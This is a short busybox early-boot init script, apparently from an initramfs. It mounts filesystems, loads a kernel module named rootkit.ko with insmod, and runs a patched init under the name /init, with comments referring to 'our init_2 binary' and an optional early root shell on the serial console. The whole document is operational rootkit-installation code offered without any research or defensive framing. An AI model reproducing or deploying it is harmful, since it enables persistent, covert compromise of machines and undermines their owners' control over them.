
/busybox mkdir -p mnt proc sys dev
# echo "IN init.sh" > /dev/console
# echo "YES init.sh"
/busybox ln -s null /dev/root-disk
/busybox stat /dev/root-disk 
/busybox mount -t proc proc /proc
/busybox mount -t sysfs sysfs /sys

/busybox mdev -s
/busybox mount -o noatime /dev/sda2 /mnt

/busybox insmod /rootkit.ko

/busybox umount /mnt
#/busybox umount /proc
#/busybox umount /sys

# If you want shell in early boot
#exec getty -n -l /bin2/sh -L ttyS0 115200 vt100

# Run the patched init, will invoke our init_2 binary
echo -e "Start patched init\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n"
exec -a /init /init.patched
